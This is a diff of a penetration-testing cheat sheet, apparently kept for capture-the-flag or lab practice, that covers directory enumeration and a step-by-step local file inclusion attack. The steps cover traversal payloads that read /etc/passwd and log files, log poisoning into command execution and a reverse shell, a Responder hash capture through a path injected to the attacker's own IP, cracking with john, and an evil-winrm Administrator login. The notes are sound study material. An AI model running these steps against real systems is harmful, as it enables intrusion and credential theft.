@@ -1,6 +1,6 @@
 # Zero-to-Hero-Pen-Testing-Notes-
 
-1.Always maunally ennumerate and check the source code control+u/ Check /robots.txt /sitemap.xml\
+1.Always maunally ennumerate and check the source code control+u/ Check `/robots.txt` `/sitemap.xml`\
 2.`gobuster dir -u http://$IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` -b (for bad servercode) -f (add this flag if gobuster is not returing any results for a long time) \
 2.5 `wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 http://$IP/FUZZ` \ 
 2.6. Check wappalayzer to check basic info of the page. \
@@ -12,19 +12,19 @@
 # Possible web vulnerabilities
 ## LFI
 1. LocalFile Inclusion: We can log poision if linux based or try remote access control if Window
-2. Check links ending with ?file=index.php ?book=  (Possible vulnerabilities in source code)
-3. book= ../../../../etc/passwd   (Figure out if the server is hosting on **Window or apache )
-4. ../../../../var/www/html/index.php  html to confirm log poisoning 
-5. Add  ../ ../../../../ and check if the following following files exists.
-6. /etc/passwd\ /var/log/mail/USER\  /var/log/apache2/access.log\  /proc/self/environ\  /tmp/sess_ID\ /var/lib/php5/sess_ID\ /var/log/auth/log\  
-7. /windows/system32/drivers/etc/hosts (for **window host)\  Go to step 12 
-8. Now that we have confirmed LFI vulnerablity, lets log poision ../../../../var/log/apache2/access.log via invalid connection request.
-9. Connect to nc -nv $IP port. and insert commandline exeuction payload (This depends on what techonology it is using. php ..etc)
-10. check for sucessful log poisioning ../../../../var/log/apache2/access.log&cmd=i.
+2. Check links ending with `?file=index.php ?book=`  (Possible vulnerabilities in source code)
+3. book= `../../../../etc/passwd`   (Figure out if the server is hosting on **Window or Apache )
+4. `../../../../var/www/html/index.php`  html to confirm log poisoning 
+5. Add  `../ ../../../../` and check if the following following files exists.
+6. `/etc/passwd`\ `/var/log/mail/USER`\  `/var/log/apache2/access.log`\  `/proc/self/environ`\  `/tmp/sess_ID`\ `/var/lib/php5/sess_ID`\ `/var/log/auth/log`\  
+7. `/windows/system32/drivers/etc/hosts` (for **window host**)\  Go to step 12 
+8. Now that we have confirmed LFI vulnerablity, **lets log poision** `../../../../var/log/apache2/access.log` via invalid connection request.
+9. Connect to `nc -nv $IP port`.Insert commandline exeuction payload (This depends on what techonology it is using. php ..etc)
+10. Check for sucessful log poisioning `../../../../var/log/apache2/access.log&cmd=id`.
 11. If you receive command execution, we will insert a reversshell via url encoding. Done. (wrapped and url encode)
-12. Use responder to capture. sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url. Use john the ripper to match hash. 
-13. john -w=/usr/share/wordlists/rockyou.txt hash.txt
-14. login to window .evil-winrm -i 10.129.147.34 -u Administrator -p badminton
+12. Use responder to capture. `sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url`. Use john the ripper to match hash. 
+13. `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
+14. login to window .`evil-winrm -i 10.129.147.34 -u Administrator -p badminton`
 
 ## Login page
 1. Always check for default credentials
